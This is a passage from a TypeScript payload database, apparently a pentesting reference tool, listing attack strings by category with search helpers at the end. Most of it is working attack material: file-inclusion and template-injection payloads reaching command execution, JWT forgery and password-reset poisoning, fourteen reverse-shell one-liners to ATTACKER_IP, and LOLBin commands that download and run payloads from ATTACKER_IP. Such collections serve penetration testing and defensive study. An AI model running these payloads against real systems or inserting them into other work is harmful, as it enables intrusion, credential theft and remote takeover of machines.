    payload: `../../../../etc/passwd%00`,
    tags: ['null-byte', 'extension-bypass', 'php-legacy'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Double URL Encoding', category: 'lfi', subcategory: 'Bypass',
    description: 'Double URL-encode ../ to bypass single-decode filters.',
    payload: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
    tags: ['double-encoding', 'bypass', 'url-encode'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Windows Backslash Traversal', category: 'lfi', subcategory: 'Windows',
    description: 'Windows-style backslash directory traversal.',
    payload: `..\\..\\..\\..\\windows\\win.ini`,
    tags: ['windows', 'backslash', 'win-ini'], platform: ['web', 'windows'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'PHP filter Base64 Read', category: 'lfi', subcategory: 'PHP Wrapper',
    description: 'PHP filter wrapper to read source code as base64 (avoids execution).',
    payload: `php://filter/convert.base64-encode/resource=index.php`,
    tags: ['php', 'filter', 'base64', 'source-code'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'PHP input RCE', category: 'lfi', subcategory: 'PHP Wrapper',
    description: 'PHP input wrapper for RCE when allow_url_include is On.',
    payload: `php://input\n\n# POST body:\n<?php system('id'); ?>`,
    tags: ['php', 'input', 'rce', 'allow-url-include'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'PHP expect RCE', category: 'lfi', subcategory: 'PHP Wrapper',
    description: 'PHP expect wrapper for direct command execution.',
    payload: `expect://id`,
    tags: ['php', 'expect', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'PHP data Wrapper', category: 'lfi', subcategory: 'PHP Wrapper',
    description: 'PHP data wrapper to inject code via base64 payload.',
    payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=\n# Decodes to: <?php system($_GET['cmd']);?>`,
    tags: ['php', 'data', 'base64', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Log Poisoning (Apache)', category: 'lfi', subcategory: 'Log Poisoning',
    description: 'Poison Apache access log via User-Agent then include it.',
    payload: `# Step 1: Poison log with User-Agent header:\nUser-Agent: <?php system($_GET['cmd']); ?>\n# Step 2: Include the log:\n../../../../var/log/apache2/access.log&cmd=id`,
    tags: ['log-poisoning', 'apache', 'user-agent', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: '/proc/self/environ', category: 'lfi', subcategory: 'Linux Special Files',
    description: 'Include /proc/self/environ to leak environment variables or inject via headers.',
    payload: `../../../../proc/self/environ`,
    tags: ['proc', 'environ', 'linux', 'information-disclosure'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Interesting Linux Files', category: 'lfi', subcategory: 'Linux Special Files',
    description: 'List of high-value Linux files to target with LFI.',
    payload: `/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/hostname\n/proc/self/cmdline\n/proc/self/status\n/home/user/.ssh/id_rsa\n/home/user/.ssh/authorized_keys\n/home/user/.bash_history\n/var/log/auth.log\n/root/.bash_history\n/etc/crontab`,
    tags: ['linux', 'file-list', 'ssh', 'shadow', 'history'], platform: ['linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Interesting Windows Files', category: 'lfi', subcategory: 'Windows',
    description: 'List of high-value Windows files to target with LFI.',
    payload: `C:\\windows\\win.ini\nC:\\windows\\system32\\config\\SAM\nC:\\windows\\system32\\config\\SYSTEM\nC:\\inetpub\\wwwroot\\web.config\nC:\\windows\\repair\\SAM\nC:\\windows\\debug\\NetSetup.log\nC:\\Users\\Administrator\\.ssh\\id_rsa\nC:\\windows\\system32\\drivers\\etc\\hosts`,
    tags: ['windows', 'file-list', 'sam', 'web-config', 'iis'], platform: ['windows'], riskLevel: 'high',
  },
]

// ============================================================================
// 7. SSTI — Server-Side Template Injection (10 payloads)
// ============================================================================

const SSTI_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Detection: Math Operations', category: 'ssti', subcategory: 'Detection',
    description: 'Universal SSTI detection payloads — if rendered as 49, SSTI is confirmed.',
    payload: `{{7*7}}\n\${7*7}\n#{7*7}\n<%= 7*7 %>\n{{7*'7'}}\n{7*7}`,
    tags: ['detection', 'probe', 'universal'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Jinja2 RCE (Python/Flask)', category: 'ssti', subcategory: 'Jinja2',
    description: 'Jinja2 SSTI to achieve RCE via Python MRO chain.',
    payload: `{{ ''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].decode() }}`,
    tags: ['jinja2', 'python', 'flask', 'rce', 'mro'], platform: ['web', 'linux'], riskLevel: 'critical',
    references: ['Jinja2 SSTI RCE'],
  },
  {
    id: pid(), name: 'Jinja2 Config Leak', category: 'ssti', subcategory: 'Jinja2',
    description: 'Jinja2 SSTI to dump Flask application configuration (secret keys, DB URIs).',
    payload: `{{ config.items() }}`,
    tags: ['jinja2', 'python', 'flask', 'config', 'secrets'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Jinja2 Lipsum RCE', category: 'ssti', subcategory: 'Jinja2',
    description: 'Jinja2 RCE via lipsum global function to access os module.',
    payload: `{{ lipsum.__globals__['os'].popen('id').read() }}`,
    tags: ['jinja2', 'python', 'lipsum', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Twig RCE (PHP)', category: 'ssti', subcategory: 'Twig',
    description: 'Twig template engine RCE via filter function in older versions.',
    payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`,
    tags: ['twig', 'php', 'rce', 'filter-callback'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Twig File Read (PHP)', category: 'ssti', subcategory: 'Twig',
    description: 'Twig template injection to read files via source function.',
    payload: `{{ "/etc/passwd"|file_excerpt(1,30) }}`,
    tags: ['twig', 'php', 'file-read'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Freemarker RCE (Java)', category: 'ssti', subcategory: 'Freemarker',
    description: 'Java Freemarker SSTI to execute OS commands.',
    payload: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ ex("id") }`,
    tags: ['freemarker', 'java', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Velocity RCE (Java)', category: 'ssti', subcategory: 'Velocity',
    description: 'Apache Velocity SSTI for command execution.',
    payload: `#set($runtime = $class.inspect("java.lang.Runtime").type)\n#set($method = $runtime.getRuntime())\n#set($process = $method.exec("id"))\n#set($reader = $process.getInputStream())\n$IOUtils.toString($reader)`,
    tags: ['velocity', 'java', 'rce', 'runtime'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Pebble RCE (Java)', category: 'ssti', subcategory: 'Pebble',
    description: 'Pebble template engine SSTI for Java command execution.',
    payload: `{% set cmd = 'id' %}\n{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}\n{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}`,
    tags: ['pebble', 'java', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Handlebars RCE (Node.js)', category: 'ssti', subcategory: 'Handlebars',
    description: 'Handlebars template injection for Node.js RCE.',
    payload: `{{#with "s" as |string|}}\n  {{#with "e"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub "constructor")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push "return require('child_process').execSync('id');"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}`,
    tags: ['handlebars', 'nodejs', 'rce', 'child-process'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
]

// ============================================================================
// 8. Authentication Bypass (10 payloads)
// ============================================================================

const AUTH_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Default Credentials (Top 20)', category: 'auth', subcategory: 'Default Credentials',
    description: 'Most common default username:password combinations found in web applications and devices.',
    payload: `admin:admin\nadmin:password\nadmin:123456\nroot:root\nroot:toor\nroot:password\ntest:test\nguest:guest\nuser:user\nadmin:admin123\nadministrator:administrator\nsa:sa\npostgres:postgres\nmysql:mysql\ntomcat:tomcat\nmanager:manager\nftp:ftp\npi:raspberry\nubnt:ubnt\nadmin:changeme`,
    tags: ['default-credentials', 'brute-force', 'common-passwords'], platform: ['web', 'linux', 'windows'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'JWT None Algorithm', category: 'auth', subcategory: 'JWT',
    description: 'Bypass JWT signature verification by changing algorithm to "none".',
    payload: `# Original header: {"alg":"HS256","typ":"JWT"}\n# Modified header: {"alg":"none","typ":"JWT"}\n# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0\n# Craft token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload-base64>.`,
    tags: ['jwt', 'none-algorithm', 'signature-bypass'], platform: ['web'], riskLevel: 'critical',
    references: ['CVE-2015-9235'],
  },
  {
    id: pid(), name: 'JWT Key Confusion (RS256 to HS256)', category: 'auth', subcategory: 'JWT',
    description: 'Confuse RS256 (asymmetric) to HS256 (symmetric) using public key as HMAC secret.',
    payload: `# 1. Get public key from /jwks.json or /.well-known/jwks.json\n# 2. Change header alg from RS256 to HS256\n# 3. Sign token with the public key as HMAC secret\n# Tool: python3 -c "\nimport jwt, json\npub_key = open('public.pem').read()\ntoken = jwt.encode({'sub':'admin','role':'admin'}, pub_key, algorithm='HS256')\nprint(token)"`,
    tags: ['jwt', 'key-confusion', 'algorithm-confusion', 'rs256', 'hs256'], platform: ['web'], riskLevel: 'critical',
    references: ['CVE-2016-10555'],
  },
  {
    id: pid(), name: 'JWT Secret Brute Force', category: 'auth', subcategory: 'JWT',
    description: 'Brute force weak JWT HMAC secrets using hashcat or jwt_tool.',
    payload: `# hashcat:\nhashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# jwt_tool:\npython3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt`,
    tags: ['jwt', 'brute-force', 'hashcat', 'weak-secret'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'OAuth Redirect URI Manipulation', category: 'auth', subcategory: 'OAuth',
    description: 'Manipulate OAuth redirect_uri to steal authorization codes or tokens.',
    payload: `# Open redirect in redirect_uri:\nhttps://auth.target.com/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://target.com/callback/../../../attacker.com&scope=openid\n\n# Subdomain takeover:\nhttps://auth.target.com/authorize?response_type=token&redirect_uri=https://evil.target.com/steal`,
    tags: ['oauth', 'redirect-uri', 'open-redirect', 'token-theft'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Password Reset Poisoning', category: 'auth', subcategory: 'Password Reset',
    description: 'Poison password reset link via Host header injection.',
    payload: `POST /reset-password HTTP/1.1\nHost: attacker.com\nX-Forwarded-Host: attacker.com\n\nemail=victim@target.com\n\n# Reset link sent to victim: https://attacker.com/reset?token=SECRET`,
    tags: ['password-reset', 'host-header', 'poisoning', 'account-takeover'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: '2FA Bypass: Direct Endpoint Access', category: 'auth', subcategory: '2FA Bypass',
    description: 'Skip 2FA step by navigating directly to post-auth endpoint.',
    payload: `# After entering valid credentials, instead of submitting 2FA code:\n# Navigate directly to /dashboard or /account\n# Some apps check auth but not 2FA completion\n\n# Also try:\n# - Send empty 2FA code\n# - Send 000000 as code\n# - Manipulate response body from "success":false to "success":true`,
    tags: ['2fa', 'bypass', 'mfa', 'direct-access'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: '2FA Bypass: Rate Limit Abuse', category: 'auth', subcategory: '2FA Bypass',
    description: 'Brute force 2FA OTP codes when rate limiting is absent or bypassable.',
    payload: `# 4-digit OTP: 10,000 combinations\n# 6-digit OTP: 1,000,000 combinations\n\n# Rate limit bypass techniques:\n# - IP rotation (X-Forwarded-For, X-Real-IP headers)\n# - Different User-Agent per request\n# - Add null bytes or whitespace to code parameter\n# - Use different parameter encodings (JSON vs form-data)`,
    tags: ['2fa', 'bypass', 'rate-limit', 'brute-force', 'otp'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Session Fixation', category: 'auth', subcategory: 'Session',
    description: 'Force a known session ID onto the victim before authentication.',
    payload: `# 1. Attacker obtains a valid session ID:\nSESSIONID=abc123\n\n# 2. Send link to victim with fixed session:\nhttps://target.com/login?PHPSESSID=abc123\n\n# 3. Victim logs in, server retains the same session ID\n# 4. Attacker uses abc123 to access victim's authenticated session`,
    tags: ['session-fixation', 'session-id', 'account-takeover'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'HTTP Verb Tampering', category: 'auth', subcategory: 'Access Control',
    description: 'Bypass auth/access controls by changing HTTP method.',
    payload: `# If GET /admin returns 403, try:\nPOST /admin\nPUT /admin\nPATCH /admin\nDELETE /admin\nOPTIONS /admin\nHEAD /admin\nTRACE /admin\nCONNECT /admin\n\n# Override headers:\nX-HTTP-Method-Override: PUT\nX-Method-Override: PUT\nX-HTTP-Method: PUT`,
    tags: ['verb-tampering', 'method-override', 'access-control', '403-bypass'], platform: ['web'], riskLevel: 'medium',
  },
]

// ============================================================================
// 9. Reverse Shells (14 payloads)
// ============================================================================

const REVSHELL_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Bash TCP', category: 'revshell', subcategory: 'Bash',
    description: 'Classic Bash reverse shell over TCP using /dev/tcp.',
    payload: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`,
    tags: ['bash', 'tcp', 'classic'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Bash UDP', category: 'revshell', subcategory: 'Bash',
    description: 'Bash reverse shell over UDP (useful when TCP is filtered).',
    payload: `bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1`,
    tags: ['bash', 'udp', 'firewall-bypass'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Bash mkfifo', category: 'revshell', subcategory: 'Bash',
    description: 'Reverse shell using mkfifo named pipe (works on more systems).',
    payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f`,
    tags: ['bash', 'mkfifo', 'named-pipe', 'netcat'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Python2 Reverse Shell', category: 'revshell', subcategory: 'Python',
    description: 'Python 2 reverse shell using socket and subprocess.',
    payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    tags: ['python', 'python2', 'socket'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Python3 Reverse Shell', category: 'revshell', subcategory: 'Python',
    description: 'Python 3 reverse shell with improved subprocess handling.',
    payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh","-i"])'`,
    tags: ['python', 'python3', 'socket'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'PHP Reverse Shell', category: 'revshell', subcategory: 'PHP',
    description: 'PHP reverse shell using fsockopen.',
    payload: `php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`,
    tags: ['php', 'fsockopen'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Perl Reverse Shell', category: 'revshell', subcategory: 'Perl',
    description: 'Perl reverse shell using IO::Socket.',
    payload: `perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    tags: ['perl', 'socket'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Ruby Reverse Shell', category: 'revshell', subcategory: 'Ruby',
    description: 'Ruby reverse shell using TCPSocket.',
    payload: `ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    tags: ['ruby', 'tcpsocket'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Netcat Traditional', category: 'revshell', subcategory: 'Netcat',
    description: 'Netcat reverse shell with -e flag (traditional netcat only).',
    payload: `nc -e /bin/sh ATTACKER_IP 4444`,
    tags: ['netcat', 'nc', 'traditional', 'dash-e'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Netcat OpenBSD (no -e)', category: 'revshell', subcategory: 'Netcat',
    description: 'Netcat reverse shell without -e flag using named pipe (OpenBSD netcat).',
    payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f`,
    tags: ['netcat', 'nc', 'openbsd', 'mkfifo', 'no-dash-e'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'PowerShell Reverse Shell', category: 'revshell', subcategory: 'PowerShell',
    description: 'PowerShell reverse shell for Windows targets.',
    payload: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    tags: ['powershell', 'windows', 'tcp'], platform: ['windows'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Java Reverse Shell', category: 'revshell', subcategory: 'Java',
    description: 'Java reverse shell using Runtime.exec().',
    payload: `Runtime r = Runtime.getRuntime();\nString[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"};\nProcess p = r.exec(cmd);`,
    tags: ['java', 'runtime', 'exec'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Node.js Reverse Shell', category: 'revshell', subcategory: 'Node.js',
    description: 'Node.js reverse shell using child_process.',
    payload: `require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');\n\n// Alternative (pure Node):\n(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
    tags: ['nodejs', 'javascript', 'child-process'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Golang Reverse Shell', category: 'revshell', subcategory: 'Golang',
    description: 'Go reverse shell one-liner compiled binary approach.',
    payload: `echo 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go`,
    tags: ['golang', 'go', 'compiled'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
]

// ============================================================================
// 10. Windows LOLBins & GTFOBins (14 payloads)
// ============================================================================

const LOLBINS_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'certutil.exe Download', category: 'lolbins', subcategory: 'Download',
    description: 'Use certutil.exe to download files from remote server (LOLBAS).',
    payload: `certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\payload.exe`,
    tags: ['certutil', 'download', 'lolbas', 'defense-evasion'], platform: ['windows'], riskLevel: 'high',
    references: ['LOLBAS certutil'],
  },
  {
    id: pid(), name: 'certutil.exe Base64 Decode', category: 'lolbins', subcategory: 'Decode',
    description: 'Use certutil.exe to decode base64-encoded payloads.',
    payload: `certutil -decode encoded.b64 payload.exe`,
    tags: ['certutil', 'base64', 'decode', 'lolbas'], platform: ['windows'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'mshta.exe HTA Execution', category: 'lolbins', subcategory: 'Execution',
    description: 'Execute HTA (HTML Application) from remote server using mshta.exe.',
    payload: `mshta http://ATTACKER_IP/payload.hta\n\n# Inline VBScript:\nmshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"":close")`,
    tags: ['mshta', 'hta', 'vbscript', 'lolbas', 'execution'], platform: ['windows'], riskLevel: 'critical',
    references: ['LOLBAS mshta', 'MITRE T1218.005'],
  },
  {
    id: pid(), name: 'rundll32.exe Execution', category: 'lolbins', subcategory: 'Execution',
    description: 'Execute DLL or JavaScript via rundll32.exe.',
    payload: `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')")`,
    tags: ['rundll32', 'javascript', 'lolbas', 'execution'], platform: ['windows'], riskLevel: 'critical',
    references: ['LOLBAS rundll32', 'MITRE T1218.011'],
  },
  {
    id: pid(), name: 'regsvr32.exe SCT Execution', category: 'lolbins', subcategory: 'Execution',
    description: 'Regsvr32 "Squiblydoo" attack — execute remote SCT scriptlet.',
    payload: `regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll`,
    tags: ['regsvr32', 'squiblydoo', 'sct', 'lolbas', 'applocker-bypass'], platform: ['windows'], riskLevel: 'critical',
    references: ['LOLBAS regsvr32', 'MITRE T1218.010'],
  },
  {
    id: pid(), name: 'bitsadmin Download', category: 'lolbins', subcategory: 'Download',
    description: 'Use BITS (Background Intelligent Transfer Service) to download files.',
    payload: `bitsadmin /transfer myJob /download /priority high http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\payload.exe`,
    tags: ['bitsadmin', 'bits', 'download', 'lolbas'], platform: ['windows'], riskLevel: 'high',
    references: ['LOLBAS bitsadmin', 'MITRE T1197'],
  },
  {
    id: pid(), name: 'wmic Process Create', category: 'lolbins', subcategory: 'Execution',
    description: 'Create a process using WMIC for lateral movement or execution.',
    payload: `wmic process call create "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"\n\n# Remote execution:\nwmic /node:TARGET_IP /user:admin /password:pass process call create "cmd.exe /c whoami > C:\\output.txt"`,
    tags: ['wmic', 'process-create', 'lateral-movement', 'lolbas'], platform: ['windows'], riskLevel: 'critical',
    references: ['LOLBAS wmic', 'MITRE T1047'],
  },
  {
    id: pid(), name: 'msiexec Remote Install', category: 'lolbins', subcategory: 'Execution',
    description: 'Execute a remote MSI package via msiexec.',
    payload: `msiexec /q /i http://ATTACKER_IP/payload.msi`,
    tags: ['msiexec', 'msi', 'remote', 'lolbas'], platform: ['windows'], riskLevel: 'critical',
    references: ['LOLBAS msiexec', 'MITRE T1218.007'],
  },
  {
    id: pid(), name: 'cmstp.exe INF Execution', category: 'lolbins', subcategory: 'Execution',
    description: 'CMSTP UAC bypass and code execution via malicious INF file.',
    payload: `# Create payload.inf:\n[version]\nSignature=$chicago$\nAdvancedINF=2.5\n[DefaultInstall_SingleUser]\nRunPreSetupCommands=exec\n[exec]\npowershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')\ntaskkill /IM cmstp.exe /F\n\n# Execute:\ncmstp.exe /ni /s payload.inf`,
    tags: ['cmstp', 'inf', 'uac-bypass', 'lolbas'], platform: ['windows'], riskLevel: 'critical',
    references: ['LOLBAS cmstp', 'MITRE T1218.003'],
  },
  {
    id: pid(), name: 'forfiles Command Execution', category: 'lolbins', subcategory: 'Execution',
    description: 'Use forfiles.exe to execute commands (bypass application whitelisting).',
    payload: `forfiles /p C:\\Windows\\System32 /m notepad.exe /c "cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"`,
    tags: ['forfiles', 'command-execution', 'whitelisting-bypass', 'lolbas'], platform: ['windows'], riskLevel: 'high',
    references: ['LOLBAS forfiles'],
  },
  {
    id: pid(), name: 'InstallUtil.exe .NET Execution', category: 'lolbins', subcategory: 'Execution',
    description: 'Execute .NET assembly via InstallUtil to bypass AppLocker.',
    payload: `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\payload.exe`,
    tags: ['installutil', 'dotnet', 'applocker-bypass', 'lolbas'], platform: ['windows'], riskLevel: 'high',
    references: ['LOLBAS InstallUtil', 'MITRE T1218.004'],
  },
  {
    id: pid(), name: 'GTFOBins: curl File Read', category: 'lolbins', subcategory: 'GTFOBins',
    description: 'Read files using curl when it has SUID bit set.',
    payload: `# If curl has SUID/sudo:\ncurl file:///etc/shadow\n\n# Download & execute:\ncurl http://ATTACKER_IP/shell.sh | bash`,
    tags: ['gtfobins', 'curl', 'suid', 'file-read', 'linux'], platform: ['linux'], riskLevel: 'high',
    references: ['GTFOBins curl'],
  },
  {
    id: pid(), name: 'GTFOBins: find Exec', category: 'lolbins', subcategory: 'GTFOBins',
    description: 'Execute commands via find when it has SUID bit set.',
    payload: `# SUID privesc:\nfind / -exec /bin/sh -p \\; -quit\n\n# Sudo:\nsudo find / -exec /bin/sh \\; -quit\n\n# Capabilities:\nfind / -exec /bin/sh -p \\; -quit`,
    tags: ['gtfobins', 'find', 'suid', 'privesc', 'linux'], platform: ['linux'], riskLevel: 'critical',
    references: ['GTFOBins find'],
  },
  {
    id: pid(), name: 'GTFOBins: vim Shell Escape', category: 'lolbins', subcategory: 'GTFOBins',
    description: 'Escape to shell from vim when run with elevated privileges.',
    payload: `# From within vim:\n:!/bin/sh\n\n# One-liner:\nvim -c ':!/bin/sh'\n\n# Sudo:\nsudo vim -c ':!/bin/sh'\n\n# Python-based (if +python):\nvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`,
    tags: ['gtfobins', 'vim', 'shell-escape', 'privesc', 'linux'], platform: ['linux', 'macos'], riskLevel: 'high',
    references: ['GTFOBins vim'],
  },
]

// ============================================================================
// Combined database
// ============================================================================

export const PAYLOAD_DATABASE: Payload[] = [
  ...XSS_PAYLOADS,
  ...SQLI_PAYLOADS,
  ...CMDI_PAYLOADS,
  ...SSRF_PAYLOADS,
  ...XXE_PAYLOADS,
  ...LFI_PAYLOADS,
  ...SSTI_PAYLOADS,
  ...AUTH_PAYLOADS,
  ...REVSHELL_PAYLOADS,
  ...LOLBINS_PAYLOADS,
]

// ============================================================================
// Helpers
// ============================================================================

export function getCategories(): { category: PayloadCategory; count: number }[] {
  const counts: Record<string, number> = {}
  for (const p of PAYLOAD_DATABASE) {
    counts[p.category] = (counts[p.category] || 0) + 1
  }
  return Object.entries(counts).map(([category, count]) => ({
    category: category as PayloadCategory,
    count,
  }))
}

export function getSubcategories(category: string): string[] {
  const set = new Set<string>()
  for (const p of PAYLOAD_DATABASE) {
    if (p.category === category) set.add(p.subcategory)
  }
  return Array.from(set).sort()
}

export function getAllPlatforms(): string[] {
  return ['web', 'windows', 'linux', 'macos']
}

export function fuzzyMatch(text: string, query: string): boolean {
  const lower = text.toLowerCase()
  const q = query.toLowerCase()
  // direct substring match
  if (lower.includes(q)) return true
  // fuzzy: check if all characters of query appear in order
  let qi = 0
  for (let i = 0; i < lower.length && qi < q.length; i++) {
    if (lower[i] === q[qi]) qi++
  }
  return qi === q.length
}

export function searchPayloads(
  payloads: Payload[],
  query: string,
  categoryFilter: string | null,
  subcategoryFilter: string | null,
  platformFilter: string | null,
  riskFilter: string | null,
): Payload[] {
  return payloads.filter((p) => {
    if (categoryFilter && p.category !== categoryFilter) return false
    if (subcategoryFilter && p.subcategory !== subcategoryFilter) return false
    if (platformFilter && !p.platform.includes(platformFilter as any)) return false
    if (riskFilter && p.riskLevel !== riskFilter) return false
    if (!query) return true
    return (
      fuzzyMatch(p.name, query) ||
      fuzzyMatch(p.description, query) ||
      fuzzyMatch(p.payload, query) ||
      fuzzyMatch(p.category, query) ||
      fuzzyMatch(p.subcategory, query) ||
      p.tags.some((t) => fuzzyMatch(t, query))
    )
  })
}
